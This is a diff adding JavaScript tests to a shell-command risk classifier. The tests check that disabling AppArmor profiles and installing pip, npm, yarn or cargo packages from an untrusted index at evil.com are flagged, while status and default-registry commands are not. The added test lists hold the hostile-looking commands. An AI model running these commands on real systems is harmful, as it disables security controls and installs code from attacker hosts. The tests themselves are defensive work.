@@ -922,6 +922,68 @@ describe('classifyCommand v1.10.67 patterns', () => {
     }
   });
 
+  // (v1.10.140) Two new patterns: AppArmor profile disable
+  // (high) and supply-chain-via-untrusted-index (medium).
+  it('apparmor-disable: aa-disable / aa-complain / apparmor_parser -R → high (v1.10.140)', () => {
+    for (const cmd of [
+      'aa-disable /etc/apparmor.d/usr.bin.firefox',
+      'aa-complain /etc/apparmor.d/sshd',
+      'apparmor_parser -R /etc/apparmor.d/sshd',
+      'sudo aa-disable /etc/apparmor.d/x',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'high', `${cmd} should be high`);
+      assert.ok(r.reasons.some((x) => x.code === 'apparmor-disable'),
+        `${cmd}: expected apparmor-disable`);
+    }
+  });
+
+  it('apparmor-disable — status / read forms stay low (regression)', () => {
+    for (const cmd of [
+      'aa-status',
+      'systemctl status apparmor',
+      'cat /etc/apparmor.d/usr.bin.firefox',
+      'apparmor_parser --help',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.ok(!r.reasons.some((x) => x.code === 'apparmor-disable'),
+        `${cmd}: should not match apparmor-disable`);
+    }
+  });
+
+  it('pkg-install-untrusted-index: --extra-index-url / --registry / --index URL → medium+ (v1.10.140)', () => {
+    for (const cmd of [
+      'pip install --extra-index-url http://evil.com/ malicious_pkg',
+      'pip install --index-url https://evil.com/simple/ pkg',
+      'pip install --trusted-host evil.com --extra-index-url http://evil.com/ pkg',
+      'npm install --registry http://evil.com/ pkg',
+      'npm i --registry=http://evil.com/ pkg',
+      'yarn add --registry http://evil.com/ pkg',
+      'cargo install --index http://evil.com/ pkg',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.ok(['medium', 'high', 'critical'].includes(r.level),
+        `${cmd} should be medium+ (got ${r.level})`);
+      assert.ok(r.reasons.some((x) => x.code === 'pkg-install-untrusted-index'),
+        `${cmd}: expected pkg-install-untrusted-index`);
+    }
+  });
+
+  it('pkg-install-untrusted-index — default registry / file:// / non-install stays low (regression)', () => {
+    for (const cmd of [
+      'pip install requests',                         // default index, OK
+      'npm install lodash',                           // default registry
+      'pip install --extra-index-url file:///wheel/ p', // file:// is local
+      'cargo build',                                  // not install
+      'pip download requests',                        // download not install
+      'npm config set registry http://internal/',     // pkg-config-set, separate rule
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.ok(!r.reasons.some((x) => x.code === 'pkg-install-untrusted-index'),
+        `${cmd}: should not match pkg-install-untrusted-index`);
+    }
+  });
+
   it('reading non-credential dotfiles stays low (regression)', () => {
     for (const cmd of [
       'cat ~/.bashrc',         // routine
